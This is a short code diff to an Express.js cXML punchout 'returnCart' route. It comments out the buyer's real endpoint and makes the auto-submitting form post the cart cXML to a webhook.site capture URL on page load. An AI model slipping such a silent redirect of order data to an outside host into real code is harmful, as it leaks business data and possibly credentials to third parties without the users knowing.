@@ -76,8 +76,10 @@ app.post('/returnCart', (req, res) => {
     </Message>
   </cXML>`;
 
+
+  //      https://buyer-system.example.com/receive
   res.send(`<html><body onload="document.forms[0].submit()">
-    <form method="post" action="https://buyer-system.example.com/receive" target="_top">
+    <form method="post" action="https://webhook.site/67007b24-857c-40e5-819f-019821a1ce88" target="_top">
       <input type="hidden" name="cxml-urlencoded" value='${cxml.replace(/'/g, '&apos;')}'>
     </form>
   </body></html>`);
